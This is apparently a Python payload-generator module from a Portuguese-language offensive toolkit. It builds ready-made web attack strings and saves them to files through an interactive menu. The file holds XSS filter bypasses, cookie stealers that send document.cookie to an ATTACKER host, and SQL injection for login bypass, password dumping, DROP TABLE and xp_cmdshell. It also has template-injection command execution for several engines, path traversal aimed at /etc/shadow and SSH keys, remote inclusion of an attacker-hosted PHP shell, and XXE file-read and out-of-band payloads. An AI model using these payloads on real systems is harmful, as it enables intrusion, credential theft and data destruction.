#!/usr/bin/env python3
"""
Payload Generator - Gerador de payloads para XSS, SQLi, SSTI, LFI/RFI
Parte do toolkit Olho de Deus
"""

import os
import sys
import json
import base64
import urllib.parse
import html
import re
from typing import List, Dict, Optional
from datetime import datetime


class PayloadEncoder:
    """Classe para encoding de payloads."""
    
    @staticmethod
    def url_encode(payload: str, double: bool = False) -> str:
        """URL encode."""
        encoded = urllib.parse.quote(payload, safe='')
        if double:
            encoded = urllib.parse.quote(encoded, safe='')
        return encoded
    
    @staticmethod
    def html_encode(payload: str) -> str:
        """HTML entity encode."""
        return html.escape(payload)
    
    @staticmethod
    def html_numeric_encode(payload: str) -> str:
        """HTML numeric entity encode."""
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode."""
        return payload.encode().hex()
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode."""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def js_unicode_encode(payload: str) -> str:
        """JavaScript Unicode encode."""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    @staticmethod
    def char_code_encode(payload: str) -> str:
        """String.fromCharCode encode."""
        codes = ','.join(str(ord(c)) for c in payload)
        return f'String.fromCharCode({codes})'


class XSSPayloads:
    """Gerador de payloads XSS."""
    
    BASIC_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<video src=x onerror=alert(1)>',
    ]
    
    FILTER_BYPASS = [
        # Sem parênteses
        '<img src=x onerror=alert`1`>',
        '<svg/onload=alert`1`>',
        # Sem aspas/crases
        '<img src=x onerror=alert(1)>',
        # Case variation
        '<ScRiPt>alert(1)</sCrIpT>',
        '<IMG SRC=x ONERROR=alert(1)>',
        # Encoded
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        # Null bytes
        '<scr\x00ipt>alert(1)</script>',
        # SVG variations
        '<svg><script>alert(1)</script></svg>',
        '<svg><animate onbegin=alert(1)>',
        # Event handlers
        '<div onmouseover=alert(1)>hover</div>',
        '<form><button formaction=javascript:alert(1)>',
        # Protocol handlers
        '<a href=javascript:alert(1)>click</a>',
        '<a href="data:text/html,<script>alert(1)</script>">',
    ]
    
    DOM_BASED = [
        '"><script>alert(document.domain)</script>',
        "'><script>alert(document.cookie)</script>",
        '<img src=x onerror=alert(document.domain)>',
        '{{constructor.constructor("alert(1)")()}}',  # AngularJS
        '${alert(1)}',  # Template literal
        '{{7*7}}',  # SSTI test
    ]
    
    COOKIE_STEALER = [
        '<script>new Image().src="http://ATTACKER/steal?c="+document.cookie</script>',
        '<img src=x onerror="fetch(\'http://ATTACKER/steal?c=\'+document.cookie)">',
        '<script>location=\'http://ATTACKER/steal?c=\'+document.cookie</script>',
    ]
    
    @classmethod
    def generate_all(cls, custom_callback: str = "alert(1)") -> List[str]:
        """Gera todos os payloads com callback customizado."""
        payloads = []
        
        for p in cls.BASIC_PAYLOADS + cls.FILTER_BYPASS + cls.DOM_BASED:
            payloads.append(p.replace("alert(1)", custom_callback))
        
        return payloads
    
    @classmethod
    def generate_encoded(cls, payload: str) -> Dict[str, str]:
        """Gera payload com múltiplos encodings."""
        encoder = PayloadEncoder()
        return {
            "original": payload,
            "url_encoded": encoder.url_encode(payload),
            "double_url": encoder.url_encode(payload, double=True),
            "html_encoded": encoder.html_encode(payload),
            "html_numeric": encoder.html_numeric_encode(payload),
            "base64": encoder.base64_encode(payload),
            "unicode": encoder.unicode_encode(payload),
            "js_unicode": encoder.js_unicode_encode(payload),
            "char_code": encoder.char_code_encode(payload) if 'alert' in payload else payload,
        }


class SQLiPayloads:
    """Gerador de payloads SQL Injection."""
    
    AUTH_BYPASS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin' --",
        "admin' #",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "1' OR '1'='1",
        "') OR ('1'='1",
        "') OR '1'='1' --",
        "1 OR 1=1",
        "1' OR 1=1 --",
        "' OR ''='",
        "' OR 1 --",
        "' OR 1=1 LIMIT 1 --",
        "admin'/*",
        "') OR ('1'='1' --",
    ]
    
    UNION_BASED = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
    ]
    
    ERROR_BASED = [
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND 1=1 AND '1'='1",
        "' AND 1=2 AND '1'='1",
    ]
    
    TIME_BASED = [
        "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
        "' AND SLEEP(5)--",  # MySQL
        "'; SELECT pg_sleep(5)--",  # PostgreSQL
        "' AND 1=1 AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]
    
    STACKED_QUERIES = [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; EXEC xp_cmdshell('whoami')--",  # MSSQL
    ]
    
    @classmethod
    def generate_for_db(cls, db_type: str = "mysql") -> List[str]:
        """Gera payloads específicos para tipo de banco."""
        payloads = cls.AUTH_BYPASS + cls.UNION_BASED + cls.ERROR_BASED
        
        if db_type.lower() == "mysql":
            payloads.extend([
                "' AND BENCHMARK(10000000,SHA1('test'))--",
                "' AND SLEEP(5) AND '1'='1",
            ])
        elif db_type.lower() == "mssql":
            payloads.extend([
                "'; WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('dir')--",
            ])
        elif db_type.lower() == "postgresql":
            payloads.extend([
                "'; SELECT pg_sleep(5)--",
                "' AND 1=CAST((SELECT version()) AS int)--",
            ])
        elif db_type.lower() == "oracle":
            payloads.extend([
                "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            ])
        
        return payloads


class SSTIPayloads:
    """Gerador de payloads Server-Side Template Injection."""
    
    DETECTION = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "@(7*7)",
        "{{7*'7'}}",
        "{{config}}",
        "{{self}}",
        "${{7*7}}",
        "#{7*7}",
        "{7*7}",
        "{{''.__class__}}",
    ]
    
    JINJA2 = [
        "{{config}}",
        "{{config.items()}}",
        "{{self.__dict__}}",
        "{{request.environ}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    ]
    
    TWIG = [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{['cat /etc/passwd']|filter('system')}}",
    ]
    
    FREEMARKER = [
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    ]
    
    VELOCITY = [
        "#set($e=\"\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")",
    ]
    
    @classmethod
    def generate_rce(cls, command: str = "id") -> List[str]:
        """Gera payloads RCE com comando customizado."""
        payloads = []
        
        # Jinja2
        payloads.append(f"{{{{lipsum.__globals__['os'].popen('{command}').read()}}}}")
        
        # Generic
        templates = [
            f"{{{{''.__class__.__mro__[2].__subclasses__()[40]('{command}').read()}}}}",
            f"${{T(java.lang.Runtime).getRuntime().exec('{command}')}}",  # Spring EL
        ]
        payloads.extend(templates)
        
        return payloads


class LFIPayloads:
    """Gerador de payloads Local File Inclusion."""
    
    LINUX_FILES = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/etc/group",
        "/etc/motd",
        "/etc/mysql/my.cnf",
        "/etc/apache2/apache2.conf",
        "/etc/nginx/nginx.conf",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/auth.log",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",
        "/home/*/.bash_history",
        "/home/*/.ssh/id_rsa",
        "/root/.bash_history",
        "/root/.ssh/id_rsa",
    ]
    
    WINDOWS_FILES = [
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\php.ini",
        "C:\\xampp\\apache\\conf\\httpd.conf",
        "C:\\xampp\\php\\php.ini",
        "C:\\inetpub\\logs\\LogFiles",
        "C:\\inetpub\\wwwroot\\web.config",
    ]
    
    TRAVERSAL_PATTERNS = [
        "../",
        "..\\",
        "....//",
        "....\\\\",
        "%2e%2e%2f",
        "%2e%2e/",
        "..%2f",
        "%2e%2e%5c",
        "..%5c",
        "..%255c",
        "%252e%252e%255c",
        "..%c0%af",
        "..%c1%9c",
    ]
    
    WRAPPERS = [
        "php://filter/convert.base64-encode/resource=",
        "php://input",
        "php://data",
        "data://text/plain,<?php phpinfo(); ?>",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "expect://id",
        "file://",
        "phar://",
    ]
    
    @classmethod
    def generate_traversal(cls, file: str, depth: int = 10) -> List[str]:
        """Gera payloads de traversal para um arquivo."""
        payloads = []
        
        for pattern in cls.TRAVERSAL_PATTERNS:
            traversal = pattern * depth
            payloads.append(f"{traversal}{file}")
        
        # Com null byte (PHP < 5.3.4)
        payloads.append(f"{'../' * depth}{file}%00")
        
        # Com wrappers
        for wrapper in cls.WRAPPERS:
            if wrapper.endswith("="):
                payloads.append(f"{wrapper}{file}")
        
        return payloads


class RFIPayloads:
    """Gerador de payloads Remote File Inclusion."""
    
    @staticmethod
    def generate(attacker_url: str, shell_name: str = "shell.txt") -> List[str]:
        """Gera payloads RFI."""
        payloads = [
            f"{attacker_url}/{shell_name}",
            f"{attacker_url}/{shell_name}%00",
            f"{attacker_url}/{shell_name}?",
            f"{attacker_url}/{shell_name}%23",  # #
            f"http://{attacker_url}/{shell_name}",
            f"https://{attacker_url}/{shell_name}",
            f"ftp://{attacker_url}/{shell_name}",
            f"data://text/plain,<?php system($_GET['cmd']); ?>",
        ]
        return payloads


class XXEPayloads:
    """Gerador de payloads XML External Entity."""
    
    FILE_READ = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
    
    SSRF = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://ATTACKER/xxe">
]>
<root>&xxe;</root>'''
    
    BLIND_OOB = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/xxe.dtd">
  %xxe;
]>
<root></root>'''
    
    @classmethod
    def generate_file_read(cls, file: str = "/etc/passwd") -> str:
        """Gera payload para leitura de arquivo."""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file}">
]>
<root>&xxe;</root>'''


class PayloadGenerator:
    """Classe principal para geração de payloads."""
    
    def __init__(self, output_dir: str = "payloads"):
        self.output_dir = output_dir
        self.encoder = PayloadEncoder()
        os.makedirs(output_dir, exist_ok=True)
    
    def generate_xss(self, callback: str = "alert(1)", encode: bool = False) -> List[Dict]:
        """Gera payloads XSS."""
        payloads = XSSPayloads.generate_all(callback)
        
        if encode:
            return [XSSPayloads.generate_encoded(p) for p in payloads]
        return [{"payload": p, "type": "xss"} for p in payloads]
    
    def generate_sqli(self, db_type: str = "mysql") -> List[Dict]:
        """Gera payloads SQLi."""
        payloads = SQLiPayloads.generate_for_db(db_type)
        return [{"payload": p, "type": "sqli", "db": db_type} for p in payloads]
    
    def generate_ssti(self, engine: str = "all") -> List[Dict]:
        """Gera payloads SSTI."""
        payloads = []
        
        if engine in ["all", "detection"]:
            payloads.extend([{"payload": p, "type": "ssti", "engine": "detection"} 
                           for p in SSTIPayloads.DETECTION])
        if engine in ["all", "jinja2"]:
            payloads.extend([{"payload": p, "type": "ssti", "engine": "jinja2"} 
                           for p in SSTIPayloads.JINJA2])
        if engine in ["all", "twig"]:
            payloads.extend([{"payload": p, "type": "ssti", "engine": "twig"} 
                           for p in SSTIPayloads.TWIG])
        if engine in ["all", "freemarker"]:
            payloads.extend([{"payload": p, "type": "ssti", "engine": "freemarker"} 
                           for p in SSTIPayloads.FREEMARKER])
        
        return payloads
    
    def generate_lfi(self, target_os: str = "linux", depth: int = 10) -> List[Dict]:
        """Gera payloads LFI."""
        files = LFIPayloads.LINUX_FILES if target_os == "linux" else LFIPayloads.WINDOWS_FILES
        payloads = []
        
        for file in files[:5]:  # Limita para os principais
            traversals = LFIPayloads.generate_traversal(file, depth)
            payloads.extend([{"payload": t, "type": "lfi", "target_file": file} for t in traversals])
        
        return payloads
    
    def generate_rfi(self, attacker_url: str) -> List[Dict]:
        """Gera payloads RFI."""
        payloads = RFIPayloads.generate(attacker_url)
        return [{"payload": p, "type": "rfi"} for p in payloads]
    
    def generate_xxe(self, target: str = "/etc/passwd") -> List[Dict]:
        """Gera payloads XXE."""
        return [
            {"payload": XXEPayloads.generate_file_read(target), "type": "xxe", "method": "file_read"},
            {"payload": XXEPayloads.FILE_READ, "type": "xxe", "method": "basic"},
            {"payload": XXEPayloads.SSRF, "type": "xxe", "method": "ssrf"},
            {"payload": XXEPayloads.BLIND_OOB, "type": "xxe", "method": "blind_oob"},
        ]
    
    def save_payloads(self, payloads: List[Dict], filename: str) -> str:
        """Salva payloads em arquivo."""
        filepath = os.path.join(self.output_dir, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            for p in payloads:
                if isinstance(p, dict):
                    f.write(f"{p.get('payload', str(p))}\n")
                else:
                    f.write(f"{p}\n")
        
        return filepath
    
    def save_payloads_json(self, payloads: List[Dict], filename: str) -> str:
        """Salva payloads em JSON."""
        filepath = os.path.join(self.output_dir, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(payloads, f, indent=2, ensure_ascii=False)
        
        return filepath


def interactive_menu():
    """Menu interativo do Payload Generator."""
    generator = PayloadGenerator()
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔══════════════════════════════════════════════════════════════╗
║           💣 PAYLOAD GENERATOR - Olho de Deus                ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  [1] 🔴 XSS Payloads                                         ║
║  [2] 💉 SQL Injection Payloads                               ║
║  [3] 📝 SSTI Payloads                                        ║
║  [4] 📁 LFI Payloads                                         ║
║  [5] 🌐 RFI Payloads                                         ║
║  [6] 📄 XXE Payloads                                         ║
║  [7] 🔄 Encoder Tool (Encode qualquer payload)               ║
║  [8] 📦 Gerar TODOS os payloads                              ║
║                                                              ║
║  [0] Voltar                                                  ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        escolha = input("Opção: ").strip()
        
        if escolha == '0':
            break
        
        elif escolha == '1':
            print("\n=== XSS Payload Generator ===")
            callback = input("Callback (default: alert(1)): ").strip() or "alert(1)"
            encode = input("Gerar versões encoded? (s/n): ").lower() == 's'
            
            payloads = generator.generate_xss(callback, encode)
            
            print(f"\n✅ {len(payloads)} payloads gerados:\n")
            for i, p in enumerate(payloads[:10], 1):
                if isinstance(p, dict) and 'payload' in p:
                    print(f"  {i}. {p['payload'][:80]}...")
                else:
                    print(f"  {i}. {str(p)[:80]}...")
            
            if len(payloads) > 10:
                print(f"  ... e mais {len(payloads) - 10}")
            
            save = input("\nSalvar em arquivo? (s/n): ").lower()
            if save == 's':
                path = generator.save_payloads(payloads, "xss_payloads.txt")
                print(f"✅ Salvo em: {path}")
        
        elif escolha == '2':
            print("\n=== SQLi Payload Generator ===")
            print("Tipos de DB: mysql, mssql, postgresql, oracle")
            db_type = input("Tipo de DB (default: mysql): ").strip() or "mysql"
            
            payloads = generator.generate_sqli(db_type)
            
            print(f"\n✅ {len(payloads)} payloads gerados:\n")
            for i, p in enumerate(payloads[:10], 1):
                print(f"  {i}. {p['payload']}")
            
            save = input("\nSalvar em arquivo? (s/n): ").lower()
            if save == 's':
                path = generator.save_payloads(payloads, f"sqli_{db_type}_payloads.txt")
                print(f"✅ Salvo em: {path}")
        
        elif escolha == '3':
            print("\n=== SSTI Payload Generator ===")
            print("Engines: all, detection, jinja2, twig, freemarker")
            engine = input("Engine (default: all): ").strip() or "all"
            
            payloads = generator.generate_ssti(engine)
            
            print(f"\n✅ {len(payloads)} payloads gerados:\n")
            for i, p in enumerate(payloads[:10], 1):
                print(f"  {i}. [{p['engine']}] {p['payload']}")
            
            save = input("\nSalvar em arquivo? (s/n): ").lower()
            if save == 's':
                path = generator.save_payloads(payloads, "ssti_payloads.txt")
                print(f"✅ Salvo em: {path}")
        
        elif escolha == '4':
            print("\n=== LFI Payload Generator ===")
            target_os = input("Target OS (linux/windows): ").strip() or "linux"
            depth = int(input("Traversal depth (default: 10): ").strip() or "10")
            
            payloads = generator.generate_lfi(target_os, depth)
            
            print(f"\n✅ {len(payloads)} payloads gerados:\n")
            for i, p in enumerate(payloads[:10], 1):
                print(f"  {i}. {p['payload'][:60]}...")
            
            save = input("\nSalvar em arquivo? (s/n): ").lower()
            if save == 's':
                path = generator.save_payloads(payloads, "lfi_payloads.txt")
                print(f"✅ Salvo em: {path}")
        
        elif escolha == '5':
            print("\n=== RFI Payload Generator ===")
            attacker_url = input("URL do atacante (ex: attacker.com): ").strip()
            if not attacker_url:
                print("URL obrigatória!")
                input("Enter para continuar...")
                continue
            
            payloads = generator.generate_rfi(attacker_url)
            
            print(f"\n✅ {len(payloads)} payloads gerados:\n")
            for i, p in enumerate(payloads, 1):
                print(f"  {i}. {p['payload']}")
            
            save = input("\nSalvar em arquivo? (s/n): ").lower()
            if save == 's':
                path = generator.save_payloads(payloads, "rfi_payloads.txt")
                print(f"✅ Salvo em: {path}")
        
        elif escolha == '6':
            print("\n=== XXE Payload Generator ===")
            target = input("Arquivo alvo (default: /etc/passwd): ").strip() or "/etc/passwd"
            
            payloads = generator.generate_xxe(target)
            
            print(f"\n✅ {len(payloads)} payloads gerados:\n")
            for i, p in enumerate(payloads, 1):
                print(f"  {i}. [{p['method']}]")
                print(f"     {p['payload'][:100]}...")
            
            save = input("\nSalvar em arquivo? (s/n): ").lower()
            if save == 's':
                path = generator.save_payloads_json(payloads, "xxe_payloads.json")
                print(f"✅ Salvo em: {path}")
        
        elif escolha == '7':
            print("\n=== Payload Encoder ===")
            payload = input("Digite o payload: ").strip()
            if not payload:
                continue
            
            encoded = XSSPayloads.generate_encoded(payload)
            
            print("\n📝 Versões encoded:\n")
            for enc_type, enc_payload in encoded.items():
                print(f"  {enc_type}:")
                print(f"    {enc_payload}\n")
        
        elif escolha == '8':
            print("\n=== Gerando TODOS os payloads ===\n")
            
            all_payloads = {
                "xss": generator.generate_xss(),
                "sqli_mysql": generator.generate_sqli("mysql"),
                "sqli_mssql": generator.generate_sqli("mssql"),
                "ssti": generator.generate_ssti(),
                "lfi_linux": generator.generate_lfi("linux"),
                "lfi_windows": generator.generate_lfi("windows"),
                "xxe": generator.generate_xxe(),
            }
            
            for name, payloads in all_payloads.items():
                path = generator.save_payloads(payloads, f"{name}_payloads.txt")
                print(f"  ✅ {name}: {len(payloads)} payloads -> {path}")
            
            print(f"\n✅ Todos os payloads salvos em: {generator.output_dir}/")
        
        input("\nPressione Enter para continuar...")


if __name__ == "__main__":
    interactive_menu()
